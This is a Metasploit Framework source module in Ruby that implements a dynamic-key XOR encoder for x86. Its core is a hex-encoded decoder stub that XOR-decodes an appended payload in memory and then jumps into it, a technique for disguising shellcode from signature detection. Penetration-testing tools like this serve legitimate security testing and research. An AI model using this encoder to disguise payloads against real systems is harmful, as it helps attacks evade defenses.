##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder::XorDynamic

  def initialize
    super(
      'Name'             => 'Dynamic key XOR Encoder',
      'Description'      => 'An x86 XOR encoder with dynamic key size',
      'Author'           => [ 'lupman', 'phra' ],
      'Arch'             => ARCH_X86,
      'License'          => MSF_LICENSE
      )
  end

  # Indicate that this module can preserve some registers
  # ...which is currently not true. This is a temp fix
  # until the full preserve_registers functionality is
  # implemented.
  def can_preserve_registers?
    true
  end

  def stub
    "\xeb\x23" +             #        jmp    _call
    "\x5b" +                 # _ret:  pop    ebx
    "\x89\xdf" +             #        mov    edi, ebx
    "\xb0\x41" +             #        mov    al, 'A'
    "\xfc" +                 #        cld
    "\xae" +                 # _lp1:  scas   al, BYTE PTR es:[edi]
    "\x75\xfd" +             #        jne    _lp1
    "\x89\xf9" +             #        mov    ecx, edi
    "\x89\xde" +             # _lp2:  mov    esi, ebx
    "\x8a\x06" +             # _lp3:  mov    al, BYTE PTR [esi]
    "\x30\x07" +             #        xor    BYTE PTR [edi], al
    "\x47" +                 #        inc    edi
    "\x66\x81\x3f\x42\x42" + #        cmp    WORD PTR [edi], 'BB'
    "\x74\x08" +             #        je     _jmp
    "\x46" +                 #        inc    esi
    "\x80\x3e\x41" +         #        cmp    BYTE PTR [esi], 'A'
    "\x75\xee" +             #        jne    _lp3
    "\xeb\xea" +             #        jmp    _lp2
    "\xff\xe1" +             # _jmp:  jmp    ecx
    "\xe8\xd8\xff\xff\xff"   # _call: call   _ret
  end

  def stub_key_term
    /A/
  end

  def stub_payload_term
    /BB/
  end
end
